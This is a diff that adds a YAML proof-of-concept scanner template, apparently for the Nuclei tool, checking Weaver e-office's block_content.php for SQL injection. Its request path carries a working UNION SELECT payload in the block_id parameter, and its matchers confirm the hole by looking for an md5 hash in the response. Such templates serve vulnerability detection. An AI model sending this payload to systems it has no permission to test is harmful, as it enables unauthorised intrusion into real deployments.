@@ -1,0 +1,29 @@
+id: poc-yaml-weaver-e-office-block-content-php-sqli
+info:
+  name: 泛微OA e-office block_content.php SQL Injection
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  metadata:
+    fingerprint: e-office
+
+variables:
+  t1: "{{rand_int(1000,100000)}}"
+  t2: "{{md5(t1)}}"
+
+http:
+  - method: GET
+    path:
+      - "/general/new_mytable/block_content.php?block_id=1%20UNION%20ALL%20SELECT%20CONCAT(0x71787a6a71,IFNULL(CAST(md5({{t1}})%20AS%20NCHAR),0x20),0x7171627671)--%20-"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "{{t2}}"
+          - "eoffice"
+          - "No such file or directory"
+          - ".php"
